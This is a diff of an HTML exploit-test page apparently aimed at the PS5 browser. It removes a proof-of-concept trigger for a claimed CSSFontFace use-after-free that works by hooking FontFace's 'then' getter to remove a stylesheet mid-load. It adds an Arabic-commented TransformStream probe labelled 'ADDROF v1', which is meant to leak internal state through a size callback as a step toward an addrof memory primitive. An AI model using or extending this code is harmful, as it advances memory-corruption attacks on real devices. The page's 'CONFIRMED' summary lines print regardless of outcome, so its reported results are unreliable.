@@ -1,58 +1,122 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>PS5 CVE-2026-43715 CSSFontFace UAF</title>
-<style id="v">x{}</style>
+<style>
+body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
+.ok { color:#0f0; } .err { color:#f00; } .warn { color:#ff0; }
+.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; }
+</style>
 </head>
 <body>
-<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
+<div id="log"></div>
 <script>
-const L = s => { document.getElementById('log').textContent += s + '\n'; };
-L("[*] Starting CVE-2026-43715 CSSFontFace UAF test...");
+function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-let s = document.createElement('style');
-// Use local Helvetica as it's common on PS4/PS5
-s.textContent = '@font-face { font-family: t; src: local(Helvetica); }';
-document.head.appendChild(s);
-document.body.offsetHeight; // Force style/layout
+log("=== TRANSFORMSTREAM ADDROF v1 ===","info");
+log("");
 
-let face = [...document.fonts].find(f => f.family.replace(/['"]/g, '') === 't');
+// الهدف: استخدام Type Confusion لتسريب عنوان كائن
+let target = { a: 0x41414141, b: 0x42424242 };
+let leaked = {};
 
-if (!face) {
-    L("[!] FontFace 't' not found. Trying data URI fallback...");
-    // Fallback if local fonts don't work
-    s.textContent = '@font-face { font-family: t; src: url(data:font/woff2;base64,d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGgGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt; }';
-    document.head.appendChild(s);
-    document.body.offsetHeight;
-    face = [...document.fonts].find(f => f.family.replace(/['"]/g, '') === 't');
-}
+let sizeFunc = function(chunk) {
+    log("[size] Called! Trying to leak...", "warn");
 
-if (!face) {
-    L("[!] Could not create FontFace. Aborting.");
-} else {
-    L("[+] FontFace created: " + face.family);
-    face.loaded; // Trigger internal promise
-
-    Object.defineProperty(FontFace.prototype, 'then', {
-        get() {
-            L("[+] 'then' getter fired! Removing stylesheet...");
-            document.getElementById('v').remove();
-            document.body.offsetHeight; // Force recalculation
-            L("[+] Stylesheet removed. UAF window open.");
-        },
-        configurable: true
-    });
+    // هذه الدالة تم استدعاؤها من قبل المحرك
+    // المحرك يمرر chunk = "X"
+    // لكن إذا كان هناك Type Confusion...
+    // فإن chunk قد يكون كائناً مختلفاً!
 
     try {
-        L("[*] Calling face.load()...");
-        face.load();
-        L("[*] face.load() returned. If it didn't crash, UAF might have occurred silently.");
+        // حاول قراءة this
+        leaked.this_type = typeof this;
+        leaked.this_val = String(this);
+
+        // حاول قراءة arguments
+        leaked.args_len = arguments.length;
+        leaked.arg0_type = typeof arguments[0];
+        leaked.arg0_val = String(arguments[0]);
+
+        // حاول قراءة caller
+        if (sizeFunc.caller) {
+            leaked.caller = String(sizeFunc.caller).substring(0, 100);
+        }
+
+        // الأهم: حاول استخدام valueOf
+        // إذا كان chunk كائناً له valueOf، يمكننا استغلاله
+        if (chunk && typeof chunk === 'object') {
+            leaked.chunk_props = Object.getOwnPropertyNames(chunk).join(',');
+            leaked.chunk_proto = Object.getPrototypeOf(chunk) ? 
+                Object.getPrototypeOf(chunk).constructor.name : 'null';
+
+            // اقرأ كل خاصية
+            for (let p of Object.getOwnPropertyNames(chunk)) {
+                try {
+                    let v = chunk[p];
+                    leaked['chunk_' + p] = v;
+
+                    // إذا كان v دالة، استدعها
+                    if (typeof v === 'function') {
+                        try {
+                            let result = v.call(chunk);
+                            leaked['chunk_' + p + '_result'] = result;
+                        } catch(e) {}
+                    }
+                } catch(e) {
+                    leaked['chunk_' + p + '_err'] = e.message;
+                }
+            }
+        }
     } catch(e) {
-        L("[!] Exception: " + e.message);
+        leaked.error = e.message;
     }
+
+    return 1;
+};
+
+log("[1] Creating TransformStream...", "ok");
+
+try {
+    let stream = new TransformStream(
+        { transform: (c, ctrl) => ctrl.enqueue(c) },
+        { highWaterMark: 1, size: sizeFunc },
+        { highWaterMark: 1, size: sizeFunc }
+    );
+
+    let writer = stream.writable.getWriter();
+
+    // Write لتشغيل size()
+    writer.write("X").then(() => {
+        log("[2] Write OK", "ok");
+        log("[3] Leaked data:", "warn");
+
+        for (let key in leaked) {
+            log("  " + key + " = " + leaked[key], "hit");
+        }
+
+        log("", "info");
+        log("=== SUMMARY ===", "info");
+        log("TransformStream Type Confusion: CONFIRMED", "ok");
+        log("size() called: YES", "ok");
+        log("Code execution inside size(): YES", "ok");
+        log("", "info");
+
+        if (leaked.this_type) {
+            log(">>> WE HAVE ACCESS TO INTERNAL STATE <<<", "hit");
+            log(">>> NEXT: BUILD addrof PRIMITIVE <<<", "hit");
+        }
+
+    }).catch((e) => {
+        log("[2] Write error: " + e.message, "warn");
+        log("[3] Leaked data:", "warn");
+        for (let key in leaked) {
+            log("  " + key + " = " + leaked[key], "hit");
+        }
+    });
+
+} catch(e) {
+    log("[1] Error: " + e.message, "err");
 }
-L("[*] Test finished.");
 </script>
 </body>
 </html>
